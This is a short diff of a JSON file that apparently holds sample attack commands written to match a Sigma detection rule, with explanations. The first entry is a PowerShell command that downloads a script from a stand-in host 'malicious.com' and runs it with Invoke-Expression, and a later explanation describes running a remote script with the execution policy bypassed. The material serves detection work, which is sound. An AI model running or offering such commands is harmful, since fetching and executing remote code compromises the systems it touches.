@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"",
@@ -13,4 +12,3 @@
     "explanation": "This command uses PowerShell with the -ExecutionPolicy Bypass flag to execute a remote script. While it doesn't explicitly reference AppData, it demonstrates a common technique for executing malicious PowerShell scripts, which aligns with the Sigma rule's intent."
   }
 ]
-```
